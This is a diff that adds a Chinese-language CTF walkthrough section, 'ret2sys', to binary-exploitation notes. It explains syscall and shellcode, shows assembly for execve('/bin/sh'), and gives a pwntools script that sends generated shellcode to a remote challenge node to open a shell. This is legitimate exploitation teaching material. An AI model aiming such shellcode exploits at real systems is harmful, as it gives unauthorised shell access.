@@ -138,3 +138,32 @@ r.recvline()
 r.sendline(playload)
 r.interactive()
 ```
+## ret2sys
+在做这题之前我们需要了解一下什么是`syscall`指令什么是`shellcode`：
+我自己的理解是，`syscall`可以执行一些用户在linux系统里没有能力或没有权限去执行的一些事情，并返回结果。可以理解为特殊的函数。具体的解释，以及如何使用`syscall`，可以看下这篇文章[SYSCALL 指令]('https://blog.csdn.net/qq_33060405/article/details/144361378')
+`shellcode`就是一段可以获得shell或者实现特定功能的机器码。CTF里shellcode的目的就是最终执行execve("/bin/sh", 0, 0);
+再来看下题目（*因为这题是帮助我们先了解汇编语言、机器码...也就是`syscall`的概念的题，所以不过多的具体展开，~~感觉详细的解释一时半会真讲不清~~*）
+![ret2sys](images/ret2sys.webp)
+详细的题目解释就不解释了，我们现在只需要知道这题需要我们传入一个正确的`shellcode`（*编写`shellcode`需要较高的汇编语言能力，这题我们使用pwntools里的工具直接生产就行了*）
+我们可以先了解一下汇编语言写成的`shellcode`是什么样的：
+```
+mov rax, 0x3b
+
+mov rdi, "/bin/sh"
+
+mov rsi, 0
+
+mov rdx, 0
+```
+这代表着执行了`execve("/bin/sh", 0, 0)`，那么我们现在只需要用`shellcode = asm(shellcraft.sh())`直接生成就行了
+```python
+from pwn import *
+context(arch='amd64', os='linux', log_level='debug')
+r=remote('node7.anna.nssctf.cn',27652)
+shellcode = asm(shellcraft.sh())
+r.recvline()
+r.sendline(shellcode)
+r.interactive()
+```
+
+
